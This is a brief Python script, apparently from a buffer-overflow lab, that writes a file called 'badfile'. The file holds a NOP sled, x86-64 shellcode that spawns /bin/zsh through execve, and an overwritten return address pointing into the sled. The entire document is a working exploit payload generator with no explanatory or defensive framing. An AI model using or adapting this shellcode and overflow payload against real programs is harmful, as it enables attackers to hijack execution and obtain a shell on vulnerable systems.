shellcode = (
    "\x48\x31\xd2"                 # xor rdx, rdx
    "\x52"                         # push rdx
    "\x48\xb8\x2f\x62\x69\x6e\x2f\x7a\x73\x68"  # mov rax, '/bin/zsh'
    "\x50"                         # push rax
    "\x48\x89\xe7"                 # 11100111 mov rdi, rsp
    "\x48\x31\xf6"                 # 11110110 xor rsi, rsi
    "\x48\x31\xC0"                 # 01001000 + 00110001 + 11000000 xorq %rax, %rax
    "\xB0\x3B"                     # mov $59, %al
    "\x0f\x05"                     # syscall
).encode('latin-1')

# 0x90 占一字节
content = bytearray(0x90 for _ in range(320))

start = 320 - len(shellcode)
print("Shellcode bias start:", start)
content[start:] = shellcode

# ret 为恶意程序的存放地址
ret = 0x7fffffffd610 + 292 + 160
# content[120:128] = (ret).to_bytes(8, byteorder='little')
content[120:128] = (ret).to_bytes(8, byteorder='little')

file = open("badfile", "wb")
file.write(content)
file.close()
